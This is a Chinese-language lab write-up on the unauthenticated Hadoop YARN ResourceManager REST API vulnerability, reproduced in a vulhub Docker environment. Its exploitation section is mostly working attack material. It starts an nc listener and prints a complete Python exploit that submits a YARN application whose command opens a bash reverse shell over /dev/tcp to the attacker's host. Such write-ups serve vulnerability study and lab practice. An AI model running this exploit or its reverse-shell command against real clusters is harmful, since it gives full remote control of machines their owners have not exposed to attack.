# Hadoop YARN resourcemanager 未授权访问漏洞

## 漏洞描述

负责对资源进行同一管理调度的ReasourceManager组件的UI管理界面开放在8080/8088端口，攻击者无需认证即可通过REST API部署任务来执行任意命令，最终可完全控制集群中所有的机器。

## 环境搭建

使用vulhub

```
[root@localhost ~]# ls /opt/vulhub-master/hadoop/unauthorized-yarn/
docker-compose.yml  exploit.py  README.md

[root@localhost ~]# docker-compose up
```

访问8088端口，可以看到Hadoop [YARN](https://so.csdn.net/so/search?q=YARN\&spm=1001.2101.3001.7020) ResourceManager WebUI界面。

![image-20220516171700499](../../.gitbook/assets/image-20220516171700499.png)

## 漏洞利用

启动nc

```
[root@localhost ~]# nc -lvp 9999
Ncat: Version 7.50 ( https://nmap.org/ncat )
Ncat: Listening on :::9999
Ncat: Listening on 0.0.0.0:9999
```

攻击脚本

```
[root@localhost unauthorized-yarn]# cat exploit.py 
#!/usr/bin/env python

import requests

target = 'http://127.0.0.1:8088/'
lhost = '192.168.32.131' # put your local host ip here, and listen at port 9999

url = target + 'ws/v1/cluster/apps/new-application'
resp = requests.post(url)
app_id = resp.json()['application-id']
url = target + 'ws/v1/cluster/apps'
data = {
    'application-id': app_id,
    'application-name': 'get-shell',
    'am-container-spec': {
        'commands': {
            'command': '/bin/bash -i >& /dev/tcp/%s/9999 0>&1' % lhost,
        },
    },
    'application-type': 'YARN',
}
requests.post(url, json=data)
```

成功攻击成功

![image-20230129210605495](../../.gitbook/assets/image-20230129210605495.png)